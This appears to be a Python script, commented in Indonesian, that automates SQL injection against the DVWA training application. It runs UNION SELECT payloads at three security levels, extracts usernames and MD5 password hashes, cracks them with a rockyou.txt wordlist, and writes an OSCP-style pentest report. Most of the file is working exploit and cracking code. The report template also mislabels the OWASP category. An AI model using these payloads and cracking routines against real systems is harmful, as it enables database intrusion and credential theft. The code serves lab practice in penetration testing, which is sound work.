# sqli_tester.py
import requests
from bs4 import BeautifulSoup
import hashlib
import time
import re

class DVWASQLiTester:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "http://localhost/dvwa"
        self.report_data = {
            'findings': [],
            'vulnerabilities': []
        }
        
    def login(self):
        """Login ke DVWA dengan kredensial default"""
        print("[*] Masuk ke DVWA...")
        login_url = f"{self.base_url}/login.php"
        
        try:
            # Dapatkan halaman login untuk mengekstrak token CSRF
            response = self.session.get(login_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            user_token_elem = soup.find('input', {'name': 'user_token'})
            
            if not user_token_elem:
                raise Exception("Tidak dapat menemukan token CSRF di halaman login")
                
            user_token = user_token_elem.get('value', '')
            if not user_token:
                raise Exception("Nilai token CSRF kosong")
            
            # Lakukan login
            login_data = {
                'username': 'admin',
                'password': 'password',
                'Login': 'Login',
                'user_token': user_token
            }
            
            response = self.session.post(login_url, data=login_data)
            if "Login failed" in response.text:
                raise Exception("Login gagal")
            print("[+] Berhasil masuk")
        except Exception as e:
            print(f"[-] Kesalahan login: {str(e)}")
            raise
        
    def set_security_level(self, level):
        """Atur tingkat keamanan DVWA"""
        print(f"[*] Mengatur tingkat keamanan ke {level}...")
        security_url = f"{self.base_url}/security.php"
        
        try:
            # Dapatkan halaman keamanan saat ini untuk mengekstrak token CSRF
            response = self.session.get(security_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            user_token_elem = soup.find('input', {'name': 'user_token'})
            
            if not user_token_elem:
                raise Exception("Tidak dapat menemukan token CSRF di halaman keamanan")
                
            user_token = user_token_elem.get('value', '')
            if not user_token:
                raise Exception("Nilai token CSRF kosong")
            
            # Atur tingkat keamanan
            security_data = {
                'security': level,
                'seclev_submit': 'Submit',
                'user_token': user_token
            }
            
            response = self.session.post(security_url, data=security_data)
            print(f"[+] Tingkat keamanan diatur ke {level}")
        except Exception as e:
            print(f"[-] Kesalahan tingkat keamanan: {str(e)}")
            raise
        
    def get_csrf_token_safe(self, url):
        """Ekstrak token CSRF dari halaman dengan penanganan error yang lebih baik"""
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Coba beberapa metode untuk menemukan token CSRF
            user_token_elem = soup.find('input', {'name': 'user_token'})
            if not user_token_elem:
                # Coba cari dengan ID
                user_token_elem = soup.find('input', {'id': 'user_token'})
            if not user_token_elem:
                # Coba cari dengan atribut value yang terlihat seperti token
                inputs = soup.find_all('input', {'type': 'hidden'})
                for inp in inputs:
                    if inp.get('name') and 'token' in inp.get('name').lower():
                        user_token_elem = inp
                        break
            
            if not user_token_elem:
                # Sebagai fallback, coba ekstrak dengan regex
                token_match = re.search(r'name=["\']user_token["\']\s+value=["\']([^"\']+)["\']', response.text)
                if token_match:
                    return token_match.group(1)
                raise Exception("Tidak dapat menemukan token CSRF dengan metode apapun")
                
            return user_token_elem.get('value', '')
        except Exception as e:
            print(f"[-] Kesalahan ekstraksi token CSRF: {str(e)}")
            # Fallback: coba tanpa token (beberapa versi DVWA mungkin tidak memerlukan token untuk semua operasi)
            return ""
        
    def extract_users_from_response(self, response_text):
        """Ekstrak data pengguna dari respons SQL injection"""
        try:
            soup = BeautifulSoup(response_text, 'html.parser')
            results_div = soup.find('div', {'class': 'vulnerable_code_area'})
            
            if not results_div:
                # Coba metode alternatif untuk menemukan hasil
                results_div = soup.find('div', string=re.compile("ID:"))
            
            users = []
            
            if results_div:
                # Temukan semua baris tabel dengan data pengguna
                tables = results_div.find_all('table')
                for table in tables:
                    rows = table.find_all('tr')[1:]  # Lewati header
                    for row in rows:
                        cols = row.find_all('td')
                        if len(cols) >= 2:
                            username = cols[0].text.strip()
                            password_hash = cols[1].text.strip()
                            # Bersihkan username dari "Surname"
                            username = re.sub(r'Surname$', '', username)
                            # Hanya tambahkan jika kita memiliki data yang valid
                            if username and password_hash and len(password_hash) == 32:
                                users.append({'username': username, 'password_hash': password_hash})
                
                # Jika tidak ada pengguna yang ditemukan, coba parsing secara berbeda
                if not users:
                    # Cari blok teks yang diformat sebelumnya yang mungkin berisi hasil
                    pre_blocks = results_div.find_all('pre')
                    for pre in pre_blocks:
                        text = pre.text
                        # Cari pola seperti "admin : 5f4dcc3b5aa765d61d8327deb882cf99"
                        matches = re.findall(r'(\w+)\s*[:\s]+\s*([a-f0-9]{32})', text)
                        for match in matches:
                            username = re.sub(r'Surname$', '', match[0])
                            users.append({'username': username, 'password_hash': match[1]})
            
            # Fallback: parsing langsung dari teks respons
            if not users:
                # Cari pola hash MD5 dalam seluruh teks
                text_content = soup.get_text()
                matches = re.findall(r'(\w+)\s*[:\s]+\s*([a-f0-9]{32})', text_content)
                for match in matches:
                    username = re.sub(r'Surname$', '', match[0])
                    # Pastikan ini adalah pengguna yang valid (bukan bagian dari debug info)
                    if username.lower() not in ['database', 'table', 'column', 'query']:
                        users.append({'username': username, 'password_hash': match[1]})
            
            return users
        except Exception as e:
            print(f"[-] Kesalahan ekstraksi pengguna: {str(e)}")
            return []
        
    def test_low_level(self):
        """Uji SQL injection pada tingkat keamanan rendah"""
        print("[*] Menguji SQL Injection Tingkat Rendah...")
        sqli_url = f"{self.base_url}/vulnerabilities/sqli/"
        
        try:
            # Payload untuk mengekstrak semua pengguna
            payload = "1' UNION SELECT user, password FROM users;-- -"
            
            # Kirim permintaan
            params = {'id': payload, 'Submit': 'Submit'}
            response = self.session.get(sqli_url, params=params)
            
            # Ekstrak hasil
            users = self.extract_users_from_response(response.text)
            
            if users:
                print(f"[+] Ditemukan {len(users)} pengguna pada tingkat rendah")
                self.report_data['findings'].append({
                    'level': 'Rendah',
                    'payload': payload,
                    'users': users,
                    'description': 'SQL injection langsung dimungkinkan karena kurangnya sanitasi input'
                })
                return users
            else:
                print("[-] Tidak ditemukan pengguna pada tingkat rendah")
        except Exception as e:
            print(f"[-] Kesalahan uji tingkat rendah: {str(e)}")
        return []
        
    def test_medium_level(self):
        """Uji SQL injection pada tingkat keamanan sedang"""
        print("[*] Menguji SQL Injection Tingkat Sedang...")
        sqli_url = f"{self.base_url}/vulnerabilities/sqli/"
        
        try:
            # Payload melewati mysql_real_escape_string (tidak perlu tanda kutip)
            payload = "1 UNION SELECT user, password FROM users;-- -"
            
            # Kirim permintaan POST
            data = {
                'id': payload,
                'Submit': 'Submit'
            }
            response = self.session.post(sqli_url, data=data)

            # Ekstrak hasil
            users = self.extract_users_from_response(response.text)
            
            if users:
                print(f"[+] Ditemukan {len(users)} pengguna pada tingkat sedang")
                self.report_data['findings'].append({
                    'level': 'Sedang',
                    'payload': payload,
                    'users': users,
                    'description': 'Melewati mysql_real_escape_string dengan menghindari tanda kutip dalam payload'
                })
                return users
            else:
                print("[-] Tidak ditemukan pengguna pada tingkat sedang")
        except Exception as e:
            print(f"[-] Kesalahan uji tingkat sedang: {str(e)}")
        return []
        
    def test_high_level(self):
        """Uji SQL injection pada tingkat keamanan tinggi"""
        print("[*] Menguji SQL Injection Tingkat Tinggi...")
        sqli_url = f"{self.base_url}/vulnerabilities/sqli/"
        setup_url = f"{self.base_url}/vulnerabilities/sqli/session-input.php"
        
        try:
            # Pertama, kirim ID melalui halaman input sesi
            payload = "1' UNION SELECT user, password FROM users;-- -"
            
            # Dapatkan token CSRF untuk halaman input sesi dengan penanganan error yang lebih baik
            user_token = self.get_csrf_token_safe(setup_url)
            
            # Kirim ID ke sesi
            setup_data = {
                'id': payload,
                'Submit': 'Submit'
            }
            
            # Tambahkan token hanya jika ditemukan
            if user_token:
                setup_data['user_token'] = user_token
            
            self.session.post(setup_url, data=setup_data)
            
            # Sekarang akses halaman hasil
            response = self.session.get(sqli_url)
            
            # Ekstrak hasil
            users = self.extract_users_from_response(response.text)
            
            if users:
                print(f"[+] Ditemukan {len(users)} pengguna pada tingkat tinggi")
                self.report_data['findings'].append({
                    'level': 'Tinggi',
                    'payload': payload,
                    'users': users,
                    'description': 'SQL injection melalui variabel sesi melewati validasi input langsung'
                })
                return users
            else:
                print("[-] Tidak ditemukan pengguna pada tingkat tinggi")
        except Exception as e:
            print(f"[-] Kesalahan uji tingkat tinggi: {str(e)}")
        return []
        
    def load_rockyou_passwords(self):
        """Muat kata sandi dari file rockyou.txt"""
        try:
            with open('rockyou.txt', 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f.readlines()]
            print(f"[+] Berhasil memuat {len(passwords)} kata sandi dari rockyou.txt")
            return passwords
        except FileNotFoundError:
            print("[-] File rockyou.txt tidak ditemukan, menggunakan daftar kata sandi default")
            return ['password', 'admin', 'user', 'guest', '123456', 'qwerty', 'abc123']
        except Exception as e:
            print(f"[-] Kesalahan memuat rockyou.txt: {str(e)}, menggunakan daftar default")
            return ['password', 'admin', 'user', 'guest', '123456', 'qwerty', 'abc123']
        
    def try_crack_hashes(self, users):
        """Coba crack hash kata sandi"""
        print("[*] Mencoba crack hash kata sandi...")
        # Muat kata sandi dari rockyou.txt atau gunakan default
        passwords = self.load_rockyou_passwords()
        cracked = []
        
        # JANGAN hapus duplikat - proses semua hash
        # Tambahkan password admin ke daftar yang akan diuji
        test_passwords = ['password', 'admin'] + passwords
        
        cracked_count = 0
        # Proses semua pengguna (termasuk yang memiliki hash sama)
        for user in users:
            hash_value = user['password_hash']
            username = user['username']
            
            for pwd in test_passwords:
                # DVWA menggunakan hashing MD5
                if hashlib.md5(pwd.encode()).hexdigest() == hash_value:
                    cracked.append({
                        'username': username,
                        'hash': hash_value,
                        'password': pwd
                    })
                    cracked_count += 1
                    print(f"[+] Berhasil crack: {username} -> {pwd}")
                    break  # Pindah ke pengguna berikutnya setelah menemukan kecocokan
                    
        print(f"[+] Berhasil crack {cracked_count} dari {len(users)} hash")
        return cracked
        
    def generate_html_report(self, cracked_passwords):
        """Hasilkan laporan HTML bergaya OSCP dalam bahasa Indonesia"""
        html_content = """
<!DOCTYPE html>
<html>
<head>
    <title>Laporan Penetration Test - Assessment SQL Injection</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 40px; background-color: #f5f5f5; }
        .header { text-align: center; color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 20px; background-color: white; margin-bottom: 30px; }
        .section { background-color: white; padding: 25px; margin: 25px 0; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .finding { border-left: 5px solid #e74c3c; padding-left: 20px; margin: 20px 0; background-color: #fefefe; }
        .high-risk { color: #c0392b; font-weight: bold; font-size: 1.1em; }
        .medium-risk { color: #f39c12; font-weight: bold; font-size: 1.1em; }
        .low-risk { color: #27ae60; font-weight: bold; font-size: 1.1em; }
        code { background-color: #f8f9fa; padding: 3px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #e74c3c; }
        pre { background-color: #2c3e50; color: #2ecc71; padding: 20px; border-radius: 6px; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.9em; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { border: 1px solid #bdc3c7; padding: 12px; text-align: left; }
        th { background-color: #3498db; color: white; font-weight: bold; }
        tr:nth-child(even) { background-color: #f8f9fa; }
        tr:hover { background-color: #e8f4f8; }
        .vuln-table { background-color: #fdf2f2; }
        .executive-summary { font-size: 1.1em; line-height: 1.6; }
        .impact-list { padding-left: 20px; }
        .impact-list li { margin-bottom: 10px; }
        .recommendations { padding-left: 20px; }
        .recommendations li { margin-bottom: 15px; }
        .references { padding-left: 20px; }
        .references li { margin-bottom: 8px; }
        a { color: #3498db; text-decoration: none; }
        a:hover { text-decoration: underline; }
        h1, h2, h3 { color: #2c3e50; }
        h1 { font-size: 2.5em; margin-bottom: 10px; }
        h2 { font-size: 1.8em; margin-bottom: 15px; border-bottom: 2px solid #3498db; padding-bottom: 8px; }
        h3 { font-size: 1.4em; margin-top: 25px; margin-bottom: 15px; }
        .timestamp { color: #7f8c8d; font-style: italic; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Laporan Penetration Test</h1>
        <h2>Assessment Kerentanan SQL Injection - DVWA</h2>
        <p class="timestamp">Dibuat pada: """ + time.strftime("%d %B %Y, %H:%M:%S") + """</p>
    </div>

    <div class="section">
        <h2>Ringkasan Eksekutif</h2>
        <div class="executive-summary">
            <p>Laporan ini menyajikan hasil assessment kerentanan SQL Injection terhadap aplikasi Damn Vulnerable Web Application (DVWA) pada berbagai tingkat keamanan. Pengujian dilakukan secara menyeluruh pada tingkat keamanan Rendah, Sedang, dan Tinggi dengan tujuan mengekstrak kredensial pengguna dari database aplikasi.</p>
            <p>Hasil pengujian menunjukkan bahwa ketiga tingkat keamanan rentan terhadap serangan SQL Injection, memungkinkan penyerang untuk mendapatkan akses tidak sah terhadap data sensitif pengguna, termasuk username dan hash password yang dapat di-crack menggunakan kamus password.</p>
            <p class="high-risk">Rating Risiko Keseluruhan: TINGGI</p>
        </div>
    </div>

    <div class="section">
        <h2>Gambaran Kerentanan</h2>
        <table class="vuln-table">
            <tr>
                <th>Nama Kerentanan</th>
                <th>Tingkat Keseriusan</th>
                <th>Skor CVSS</th>
                <th>Deskripsi</th>
            </tr>
            <tr>
                <td>SQL Injection</td>
                <td class="high-risk">Tinggi</td>
                <td>8.3 CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L</td>
                <td>Penyisipan query SQL berbahaya melalui input pengguna yang tidak divalidasi</td>
            </tr>
        </table>
        <p><strong>CWE:</strong> CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</p>
        <p><strong>OWASP Top 10:</strong> A03:2017 - Sensitive Data Exposure</p>
    </div>

    <div class="section">
        <h2>Temuan Teknis</h2>
"""
        
        # Tambahkan temuan untuk setiap tingkat
        for finding in self.report_data['findings']:
            html_content += f"""
        <div class="finding">
            <h3>Tingkat Keamanan {finding['level']}</h3>
            <p><strong>Deskripsi Kerentanan:</strong> {finding['description']}</p>
            <p><strong>Payload yang Digunakan:</strong></p>
            <pre>{finding['payload']}</pre>
            <p><strong>Kredensial yang Diekstrak:</strong></p>
            <table>
                <tr><th>Username</th><th>Password Hash (MD5)</th></tr>
"""
            for user in finding['users']:
                html_content += f"<tr><td>{user['username']}</td><td>{user['password_hash']}</td></tr>"
            html_content += "</table></div>"
        
        # Tambahkan bagian kata sandi yang di-crack
        if cracked_passwords:
            html_content += """
        <div class="finding">
            <h3>Kata Sandi yang Berhasil Di-crack</h3>
            <p>Kata sandi berikut berhasil dipulihkan dengan membandingkan hash terhadap kamus kata sandi (menggunakan rockyou.txt dan kamus default):</p>
            <table>
                <tr><th>Username</th><th>Password Hash</th><th>Kata Sandi yang Dipulihkan</th></tr>
"""
            for pwd in cracked_passwords:
                html_content += f"<tr><td>{pwd['username']}</td><td>{pwd['hash']}</td><td>{pwd['password']}</td></tr>"
            html_content += "</table></div>"
        
        html_content += """
    </div>

    <div class="section">
        <h2>Bukti Konsep (Proof of Concept)</h2>
        <p>Berikut ini menunjukkan eksploitasi yang berhasil pada setiap tingkat keamanan:</p>
"""
        
        for finding in self.report_data['findings']:
            html_content += f"""
        <h3>Eksploitasi Tingkat {finding['level']}</h3>
        <p><strong>Permintaan HTTP yang Digunakan:</strong></p>
        <pre>GET /dvwa/vulnerabilities/sqli/?id={finding['payload']}&Submit=Submit HTTP/1.1
Host: localhost
Cookie: [Session Cookies]
User-Agent: Penetration Testing Tool</pre>
        <p><strong>Cuplikan Respons Server:</strong></p>
        <pre>[Database mengembalikan kredensial pengguna dalam format tabel HTML]</pre>
"""
        
        html_content += """
    </div>

    <div class="section">
        <h2>Dampak Kerentanan</h2>
        <p>Eksploitasi yang berhasil terhadap kerentanan SQL injection ini memiliki dampak serius terhadap keamanan aplikasi dan data pengguna:</p>
        <ul class="impact-list">
            <li><strong>Pencurian Data Pengguna:</strong> Penyerang dapat mengekstrak semua kredensial pengguna dari database, termasuk username dan hash password</li>
            <li><strong>Akses ke Data Sensitif:</strong> Memungkinkan akses tidak sah terhadap informasi pribadi dan data aplikasi yang sensitif</li>
            <li><strong>Eskalasi Hak Akses:</strong> Potensi eskalasi hak akses ke tingkat administrator database jika tidak dikonfigurasi dengan benar</li>
            <li><strong>Serangan Lanjutan:</strong> Kredensial yang telah disusupi dapat digunakan untuk serangan lebih lanjut seperti login paksa atau serangan terhadap sistem lain</li>
            <li><strong>Pelanggaran Kepercayaan:</strong> Kerentanan ini dapat merusak reputasi organisasi dan kepercayaan pengguna terhadap aplikasi</li>
        </ul>
        <p class="high-risk">Ini merupakan risiko keamanan kritis yang memerlukan remediasi segera untuk mencegah insiden keamanan.</p>
    </div>

    <div class="section">
        <h2>Rekomendasi Remediasi</h2>
        <p>Untuk mengatasi kerentanan SQL Injection yang teridentifikasi, disarankan implementasi langkah-langkah berikut:</p>
        <ol class="recommendations">
            <li><strong>Gunakan Query Berparameter (Prepared Statements):</strong> Implementasikan prepared statements dengan query berparameter untuk memisahkan kode SQL dari data pengguna secara mutlak.</li>
            <li><strong>Validasi dan Sanitasi Input:</strong> Validasi dan sanitasi semua input pengguna menggunakan daftar izin (allowlist) dan larang karakter khusus yang tidak diperlukan.</li>
            <li><strong>Prinsip Hak Akses Minimum (Least Privilege):</strong> Konfigurasikan pengguna database dengan hak akses minimum yang diperlukan untuk operasi aplikasi.</li>
            <li><strong>Implementasi Web Application Firewall (WAF):</strong> Terapkan WAF untuk mendeteksi dan memblokir upaya SQL injection secara real-time.</li>
            <li><strong>Pengujian Keamanan Berkala:</strong> Lakukan penetration testing dan code review secara berkala untuk mengidentifikasi kerentanan baru.</li>
            <li><strong>Pengkodean Aman:</strong> Edukasi tim pengembang tentang praktik pengkodean aman dan kerentanan OWASP Top 10.</li>
        </ol>
    </div>

    <div class="section">
        <h2>Referensi dan Sumber Daya</h2>
        <ul class="references">
            <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP SQL Injection</a> - Panduan komprehensif tentang SQL Injection</li>
            <li><a href="https://cwe.mitre.org/data/definitions/89.html" target="_blank">CWE-89: SQL Injection</a> - Deskripsi detail dari weakness CWE-89</li>
            <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank">OWASP SQL Injection Prevention Cheat Sheet</a> - Panduan pencegahan SQL Injection</li>
            <li><a href="https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf" target="_blank">NIST Cybersecurity Framework</a> - Kerangka kerja keamanan siber</li>
        </ul>
    </div>

    <div class="section">
        <h2>Kesimpulan</h2>
        <p>Pengujian terhadap DVWA menunjukkan bahwa aplikasi web rentan terhadap serangan SQL Injection pada semua tingkat keamanan yang diuji. Kerentanan ini dapat dieksploitasi untuk mencuri data pengguna secara tidak sah, yang merupakan ancaman serius terhadap keamanan dan privasi pengguna.</p>
        <p>Segera menerapkan rekomendasi remediasi yang telah disebutkan untuk memperkuat keamanan aplikasi dan mencegah potensi insiden keamanan di masa depan.</p>
    </div>
</body>
</html>
"""
        
        with open('sqli_report.html', 'w', encoding='utf-8') as f:
            f.write(html_content)
        print("[+] Laporan HTML dihasilkan: sqli_report.html")

    def run(self):
        """Fungsi eksekusi utama"""
        try:
            # Login ke DVWA
            self.login()
            
            # Uji semua tingkat keamanan
            levels = ['low', 'medium', 'high']
            all_users = []
            
            for level in levels:
                self.set_security_level(level)
                time.sleep(1)  # Jeda kecil antar permintaan
                
                if level == 'low':
                    users = self.test_low_level()
                    if users:
                        all_users = users
                elif level == 'medium':
                    users = self.test_medium_level()
                elif level == 'high':
                    users = self.test_high_level()                    
  
                time.sleep(2)  # Jeda sebelum tingkat berikutnya
            
            # Coba crack kata sandi
            cracked_passwords = self.try_crack_hashes(all_users)
            
            # Hasilkan laporan
            self.generate_html_report(cracked_passwords)
            
            print("[*] Pengujian selesai dengan sukses!")
            
        except Exception as e:
            print(f"[-] Kesalahan selama pengujian: {str(e)}")
            import traceback
            traceback.print_exc()

if __name__ == "__main__":
    tester = DVWASQLiTester()
    tester.run()